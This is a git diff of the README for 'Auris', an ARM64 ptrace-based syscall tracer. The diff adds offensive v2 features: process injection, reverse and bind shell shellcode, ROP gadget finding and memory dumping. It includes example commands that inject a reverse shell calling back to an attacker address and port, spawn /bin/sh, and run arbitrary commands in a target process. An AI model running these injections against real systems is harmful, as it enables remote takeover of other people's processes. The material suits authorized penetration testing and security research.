@@ -2,14 +2,17 @@
 
 **/ˈaʊ.rɪs/** - (Latin: *to listen*)
 
-**ARM64 Syscall Tracer and Behavioral Security Analyzer**
+**ARM64 Syscall Tracer, Behavioral Security Analyzer & Offensive Security Toolkit**
 
-Auris is a research grade security tool that listens to programs at the syscall level. It intercepts every system call a program makes, including file operations, network connections, and process creation, and uses this data to build behavioral profiles, detect anomalies, and enforce security policies.
+Auris is a research-grade security tool that operates at the syscall level. It intercepts every system call a program makes, including file operations, network connections, and process creation, and uses this data to build behavioral profiles, detect anomalies, and enforce security policies.
+
+**Version 2** adds offensive security capabilities including process injection, shellcode execution, and ROP chain building for penetration testing and red team operations.
 
 Built for ARM64 Linux using the kernel's ptrace interface. Runs entirely in userspace with no kernel modules required.
 
 ## Features
 
+### Blue Team (Defensive)
 - **Syscall Tracing**: Trace target programs using ptrace, capturing detailed syscall metadata including arguments, return values, and timing
 - **Behavioral Profiling**: Build baseline profiles from traces to characterize normal program behavior
 - **Anomaly Detection**: Compare runtime behavior against baselines to detect deviations
@@ -17,6 +20,15 @@ Built for ARM64 Linux using the kernel's ptrace interface. Runs entirely in user
 - **Activity Graph**: Model process/file/network activity as a graph for visualization and analysis
 - **Policy Engine**: Generate and enforce restrictive syscall policies with alert or block modes
 - **AI Integration**: Optional integration with local LLM services for natural language security analysis
+
+### Red Team (Offensive) - v2
+- **Process Injection**: Inject shellcode into running processes via ptrace
+- **Shellcode Library**: Pre-built ARM64 shellcode payloads (reverse shell, bind shell, exec)
+- **ROP Gadget Finder**: Scan binaries for ROP gadgets and build chains
+- **Memory Analysis**: Dump and analyze target process memory maps
+- **Target Discovery**: Find injectable processes and assess permissions
+
+> ⚠️ **WARNING**: The offensive security features are for authorized penetration testing and security research only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
 
 ## Requirements
 
@@ -113,6 +125,37 @@ auris enforce -P <policy-id> -m block -- ./myapp
 ```bash
 # Analyze profile with AI
 auris analyze -p <profile-id> -a http://localhost:11434/api/generate -M llama2
+```
+
+### Inject Mode - Process Injection (v2)
+
+```bash
+# List injectable processes
+auris inject list
+
+# Show process information
+auris inject info -p <pid>
+
+# Show process memory map
+auris inject maps -p <pid>
+
+# Inject exec /bin/sh shellcode
+auris inject shellcode -p <pid> -t exec_sh
+
+# Inject reverse shell (connects back to attacker)
+auris inject shellcode -p <pid> -t reverse -i 10.0.0.1 -P 4444
+
+# Inject bind shell (listens on port)
+auris inject shellcode -p <pid> -t bind -P 4444
+
+# Execute arbitrary command
+auris inject shellcode -p <pid> -t exec_cmd -c "id > /tmp/pwned"
+
+# Find ROP gadgets in a binary
+auris inject gadgets -b /lib/aarch64-linux-gnu/libc.so.6
+
+# Dump memory from target process
+auris inject dump -p <pid> -a 0x400000 -n 4096
 ```
 
 ## Options
